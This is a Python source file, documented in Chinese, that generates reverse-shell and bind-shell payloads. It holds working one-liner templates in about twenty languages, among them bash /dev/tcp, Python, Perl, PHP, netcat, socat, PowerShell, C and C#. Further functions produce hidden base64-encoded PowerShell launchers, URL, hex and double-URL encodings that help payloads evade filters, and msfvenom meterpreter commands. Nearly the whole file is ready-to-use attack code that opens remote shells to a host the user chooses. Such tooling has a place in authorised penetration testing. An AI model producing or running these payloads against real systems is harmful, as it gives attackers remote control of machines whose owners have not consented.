"""
反向 Shell / 绑定 Shell Payload 生成器 v1.0
───────────────────────────────────────────
覆盖语言: bash, sh, zsh, python, python3, perl, php, ruby, lua,
          java, c, c#, powershell, nc, ncat, socat, telnet, awk, node, go

功能:
  • 生成反弹 shell / 绑定 shell
  • Base64 / Hex / URL 编码变体
  • MSFVenom 命令生成
  • PowerShell 编码反弹

纯字符串生成, 无外部依赖。
"""

import base64, urllib.parse, binascii
from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class ShellPayload:
    language: str
    type: str           # reverse / bind
    payload: str
    encoded: Dict[str, str]


# ==================== 反弹 Shell 模板 ====================

REVERSE_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
    "sh": "sh -i >& /dev/tcp/{host}/{port} 0>&1",
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
    "python": (
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "python3": (
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "perl": (
        "perl -e 'use Socket;$i=\"{host}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "ruby": (
        "ruby -rsocket -e 'f=TCPSocket.open(\"{host}\",{port}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "lua": (
        "lua -e \"require('socket');require('os');t=socket.tcp();"
        "t:connect('{host}',{port});os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "nc": "nc -e /bin/sh {host} {port}",
    "ncat": "ncat {host} {port} -e /bin/sh",
    "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
    "telnet": "TF=$(mktemp -u); mkfifo $TF && telnet {host} {port} 0<$TF | /bin/sh 1>$TF",
    "awk": (
        "awk 'BEGIN{s=\"/inet/tcp/0/{host}/{port}\"; while(1){ do{ printf \"$ \" |& s; s |& getline c;"
        " if($c ~ /exit/){close(s); exit} c |& getline out; print out |& s; close(c); close(out);} while(1); close(s);}}'"
    ),
    "node": (
        "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{host}/{port} 0>&1\")'"
    ),
    "go": (
        "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{host}:{port}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go"
    ),
    "powershell": (
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};$client.Close()\""
    ),
    "java": (
        "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};"
        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
    ),
    "c": (
        "#include <stdio.h>\\n#include <sys/socket.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n"
        "int main(){{int sockfd=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in sa;sa.sin_family=AF_INET;"
        "sa.sin_addr.s_addr=inet_addr(\"{host}\");sa.sin_port=htons({port});connect(sockfd,(struct sockaddr*)&sa,sizeof sa);"
        "dup2(sockfd,0);dup2(sockfd,1);dup2(sockfd,2);execve(\"/bin/sh\",0,0);}}"
    ),
    "csharp": (
        "using System;using System.Net.Sockets;using System.Text;using System.Diagnostics;class P{{static void Main(){{"
        "TcpClient c=new TcpClient(\"{host}\",{port});NetworkStream s=c.GetStream();StreamReader r=new StreamReader(s);"
        "StreamWriter w=new StreamWriter(s);Process p=new Process();p.StartInfo.FileName=\"cmd.exe\";"
        "p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;"
        "p.StartInfo.RedirectStandardError=true;p.Start();p.BeginOutputReadLine();p.BeginErrorReadLine();"
        "p.OutputDataReceived+=(o,e)=>{{w.WriteLine(e.Data);w.Flush();}};"
        "p.ErrorDataReceived+=(o,e)=>{{w.WriteLine(e.Data);w.Flush();}};"
        "while(true){{string cmd=r.ReadLine();p.StandardInput.WriteLine(cmd);}}}}}}"
    ),
}

# ==================== 绑定 Shell 模板 ====================

BIND_TEMPLATES = {
    "bash": "bash -c 'exec bash -i &>/dev/tcp/{bindhost}/{port} <&1'",
    "nc": "nc -lvp {port} -e /bin/sh",
    "ncat": "ncat -lvp {port} -e /bin/sh",
    "socat": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh",
    "python": (
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"{bindhost}\",{port}));s.listen(1);"
        "c,a=s.accept();[os.dup2(c.fileno(),i) for i in range(3)];subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "powershell": (
        "powershell -nop -c \"$listener = New-Object System.Net.Sockets.TcpListener({port});$listener.Start();"
        "$client = $listener.AcceptTcpClient();$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};$client.Close();$listener.Stop()\""
    ),
}


class ShellGenerator:
    """反弹/绑定 Shell Payload 生成器"""

    def __init__(self):
        pass

    def list_languages(self) -> List[str]:
        """列出所有支持的语言"""
        return list(REVERSE_TEMPLATES.keys())

    def reverse(self, language: str, host: str, port: int) -> Optional[ShellPayload]:
        """生成反弹 shell"""
        tmpl = REVERSE_TEMPLATES.get(language)
        if not tmpl:
            return None
        payload = tmpl.format(host=host, port=port)
        return ShellPayload(language=language, type="reverse",
                            payload=payload, encoded=self._encode_all(payload))

    def bind(self, language: str, bindhost: str, port: int) -> Optional[ShellPayload]:
        """生成绑定 shell"""
        tmpl = BIND_TEMPLATES.get(language)
        if not tmpl:
            return None
        payload = tmpl.format(bindhost=bindhost, port=port)
        return ShellPayload(language=language, type="bind",
                            payload=payload, encoded=self._encode_all(payload))

    def all_reverse(self, host: str, port: int) -> List[ShellPayload]:
        """生成所有语言的反弹 shell"""
        return [self.reverse(lang, host, port) for lang in REVERSE_TEMPLATES.keys()
                if self.reverse(lang, host, port)]

    def powershell_b64(self, host: str, port: int) -> str:
        """生成 PowerShell Base64 编码反弹 shell(最常用)"""
        raw = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});"
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()};$client.Close()"
        )
        # PowerShell 用 UTF-16LE 编码
        b64 = base64.b64encode(raw.encode("utf-16-le")).decode()
        return f"powershell -nop -w hidden -enc {b64}"

    def msfvenom(self, payload_type: str = "linux/x86/meterpreter/reverse_tcp",
                 host: str = "", port: int = 4444, fmt: str = "elf") -> str:
        """生成 MSFVenom 命令"""
        cmd = f"msfvenom -p {payload_type}"
        if host:
            cmd += f" LHOST={host}"
        if port:
            cmd += f" LPORT={port}"
        cmd += f" -f {fmt}"
        if fmt == "elf":
            cmd += " -o /tmp/payload.elf"
        elif fmt == "exe":
            cmd += " -o /tmp/payload.exe"
        elif fmt == "raw":
            cmd += " -o /tmp/payload.bin"
        elif fmt == "py":
            cmd += " -o /tmp/payload.py"
        elif fmt == "php":
            cmd += " -o /tmp/payload.php"
        elif fmt == "asp":
            cmd += " -o /tmp/payload.asp"
        elif fmt == "aspx":
            cmd += " -o /tmp/payload.aspx"
        elif fmt == "jsp":
            cmd += " -o /tmp/payload.jsp"
        elif fmt == "war":
            cmd += " -o /tmp/payload.war"
        return cmd

    def _encode_all(self, payload: str) -> Dict[str, str]:
        """生成各种编码变体"""
        encoded = {}
        try:
            encoded["base64"] = base64.b64encode(payload.encode()).decode()
        except Exception:
            pass
        try:
            encoded["url"] = urllib.parse.quote(payload)
        except Exception:
            pass
        try:
            encoded["hex"] = binascii.hexlify(payload.encode()).decode()
        except Exception:
            pass
        try:
            # double url
            encoded["double_url"] = urllib.parse.quote(urllib.parse.quote(payload))
        except Exception:
            pass
        return encoded


# ==================== 便捷函数 ====================

def shell_reverse(language: str, host: str, port: int) -> Optional[Dict]:
    """生成反弹 shell"""
    s = ShellGenerator().reverse(language, host, port)
    if not s:
        return None
    return {"language": s.language, "type": s.type, "payload": s.payload, "encoded": s.encoded}


def shell_bind(language: str, bindhost: str, port: int) -> Optional[Dict]:
    """生成绑定 shell"""
    s = ShellGenerator().bind(language, bindhost, port)
    if not s:
        return None
    return {"language": s.language, "type": s.type, "payload": s.payload, "encoded": s.encoded}


def shell_all(host: str, port: int) -> List[Dict]:
    """生成所有语言的反弹 shell"""
    return [{"language": s.language, "payload": s.payload}
            for s in ShellGenerator().all_reverse(host, port)]


def shell_powershell_b64(host: str, port: int) -> str:
    """PowerShell Base64 反弹 shell"""
    return ShellGenerator().powershell_b64(host, port)


def shell_msfvenom(payload_type: str = "linux/x86/meterpreter/reverse_tcp",
                   host: str = "", port: int = 4444, fmt: str = "elf") -> str:
    """MSFVenom 命令生成"""
    return ShellGenerator().msfvenom(payload_type, host, port, fmt)


def shell_languages() -> List[str]:
    """列出所有支持的语言"""
    return ShellGenerator().list_languages()
